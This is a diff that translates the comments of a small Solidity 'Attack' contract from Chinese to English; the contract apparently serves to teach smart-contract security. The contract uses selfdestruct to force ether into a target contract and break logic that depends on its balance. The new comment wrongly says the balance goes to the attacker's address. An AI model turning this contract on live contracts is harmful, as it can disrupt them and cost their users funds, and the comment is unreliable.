@@ -1,17 +1,16 @@
 // SPDX-License-Identifier: SEE LICENSE IN LICENSE
 pragma solidity ^0.8.0;
 
-// 攻击者合约
+// attack contract
 contract Attack {
-    // 构造函数，设置为payable
     constructor() payable {}
 
-    // 攻击函数，参数为目标合约地址
+    // Use selfdestruct to transfer the balance of the contract to the attacker's address
     function attack(address _addr) external {
         selfdestruct(payable(_addr));
     }
 
-    // 查看合约余额
+    // check the balance of the contract
     function getBalance() public view returns (uint) {
         return address(this).balance;
     }
